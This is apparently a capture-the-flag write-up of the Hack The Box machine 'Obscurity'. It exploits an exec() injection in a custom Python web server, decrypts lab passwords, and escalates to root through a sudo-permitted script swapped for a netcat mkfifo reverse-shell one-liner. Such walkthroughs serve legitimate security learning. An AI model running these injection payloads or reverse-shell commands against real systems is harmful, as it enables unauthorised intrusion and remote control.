---
title: 'Obscurity HTB'
date: '2020-05-09 20:00:00'
author: fuxsocy
description: Obscurity By Fuxsocy
image: 
    path: '/images/obscurity.png'
categories: ["htb"]
---

## User



From Nmap ports 22,80 and 8080 are open. port 80 does nothing. port 8080 is a web server, and is a custom webserver.
At the home page of the website there is a message which says  
```Message to server devs: the current source code for the web server is in 'SuperSecyreServer.py' in the secret development directory.```

I run wfuzz to find the *dir* only because I already know the filename.

```
wfuzz -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
```

I find the file located at /develop/

After reading the code I found an rce on these lines of the code.
```
def serveDoc(self, path, docRoot):
        path = urllib.parse.unquote(path)
        try:
            info = "output = 'Document: {}'" # Keep the output for later debug
            exec(info.format(path)) # This is how you do string formatting, right?
            cwd = os.path.dirname(os.path.realpath(__file__))
            docRoot = os.path.join(cwd, docRoot)
            if path == "/":
                path = "/index.html"
            requested = os.path.join(docRoot, path[1:])
            if os.path.isfile(requested):
                mime = mimetypes.guess_type(requested)
                mime = (mime if mime[0] != None else "text/html")
                mime = MIMES[requested.split(".")[-1]]
                try:
                    with open(requested, "r") as f:
                        data = f.read()
                except:
                    with open(requested, "rb") as f:
                        data = f.read()
                status = "200"
            else:
                errorPage = os.path.join(docRoot, "errors", "404.html")
                mime = "text/html"
                with open(errorPage, "r") as f:
                    data = f.read().format(path)
                status = "404"
```

The path gets inside the exec function. So If I send inside the path something like `/';os.system("ping IP");'` given that the os library is already imported by the script I get code execution? Let's try to send that but encoded.

I use `https://www.urlencoder.org/` and encode this command `';os.system("ping 10.10.14.81");'` and on my box I listen for any ping request using  
`tcpdump -i tun0 -n icmp `

I immediately get a request back.
```
root@kali:~/Downloads# tcpdump -i tun0 -n icmp  
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
16:24:49.507887 IP 10.10.14.81 > 10.10.10.168: ICMP echo request, id 9799, seq 106, length 64
```

I get a reverse shell, inside /home/robert folder I find a python script which encrypts and decrypts files and some files. I type this command and get a password. `python3 SuperSecureCrypt.py -i out.txt -o /tmp/d.txt -k "$(cat check.txt)" -d` the password is `alexandrovich`, now I decrypt the passwordreminder with this password. the command is  `python3 SuperSecureCrypt.py -i passwordreminder.txt -o /tmp/a.txt -k "alexandrovich" -d`
```
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file passwordreminder.txt...
Decrypting...
Writing to /tmp/a.txt...
www-data@obscure:/home/robert$ cat /tmp/a.txt 
SecThruObsFTW
```
I use this password to ssh into the box, as robert user.

# Root

After a bit of enumerating inside the box, I finally find that I can run this python script as root.   
```
robert@obscure:~$ sudo -l
Matching Defaults entries for robert on obscure:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on obscure:
    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
robert@obscure:~$ 

```
I can rename that folder to something else and then create the folder with the same name and the python script with the same name, and then execute the command to get a reverse shell.


```
robert@obscure:~$ cd BetterSSH/
robert@obscure:~/BetterSSH$ ls -la
total 12
drwxr-xr-x 2 root   root   4096 Dec  2 09:47 .
drwxr-xr-x 7 robert robert 4096 Dec  2 09:53 ..
-rwxr-xr-x 1 root   root   1805 Oct  5 13:09 BetterSSH.py
robert@obscure:~/BetterSSH$ cd ..
robert@obscure:~$ mv BetterSSH/ a
robert@obscure:~$ mkdir BetterSSH
robert@obscure:~$ cd BetterSSH/
robert@obscure:~/BetterSSH$ touch BetterSSH.py
robert@obscure:~/BetterSSH$ vim BetterSSH.py
robert@obscure:~/BetterSSH$ cat BetterSSH.py 
import os
os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.81 7979 >/tmp/f")
robert@obscure:~/BetterSSH$ sudo -u root /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```
